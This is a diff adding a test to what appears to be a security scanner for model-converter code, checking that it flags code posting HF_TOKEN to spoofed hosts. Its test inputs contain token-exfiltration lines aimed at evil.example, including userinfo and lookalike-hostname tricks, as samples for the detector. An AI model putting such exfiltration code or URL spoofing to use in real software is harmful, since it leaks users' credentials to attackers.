@@ -3140,3 +3140,47 @@ def test_the_hub_narrowing_does_not_reach_any_other_rule():
     assert any("credential paths" in f.check for f in scan_converter_source(creds)), (
         [f.check for f in scan_converter_source(creds)]
     )
+
+
+def test_the_hub_allowance_reads_the_real_hostname():
+    """`https://huggingface.co:443@evil.example/collect` sends the request to
+    evil.example: everything before the @ is user information. Taking the
+    authority up to the first colon read it as huggingface.co, which turned the
+    allowance into a way to post HF_TOKEN anywhere and have this say nothing.
+    """
+    from unsloth_zoo.converter_scan import scan_converter_source
+
+    def _findings(url):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                f'URL = "{url}"\n'
+                'requests.post(URL, data = {"t": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _findings("https://huggingface.co:443@evil.example/collect"), (
+        "userinfo before the @ must not stand in for the hostname"
+    )
+    # A host that merely starts with the hub's name is a different host.
+    assert _findings("https://huggingface.co.evil.example/collect")
+    # A URL with no host at all names no destination, so nothing is suppressed.
+    assert _findings("https:///collect")
+    # And it still counts when it sits beside a real hub URL, which is the shape
+    # that matters: dropping hostless URLs instead of recording them let one be
+    # hidden behind a hub link in the same file.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co/api/models"\n'
+            'OUT = "https:///collect"\n'
+            'requests.post(OUT, data = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+    # The shapes that really are the hub still pass, port and case included.
+    assert _findings("https://huggingface.co/api/models") == []
+    assert _findings("https://huggingface.co:443/api/models") == []
+    assert _findings("https://HuggingFace.CO/api/models") == []
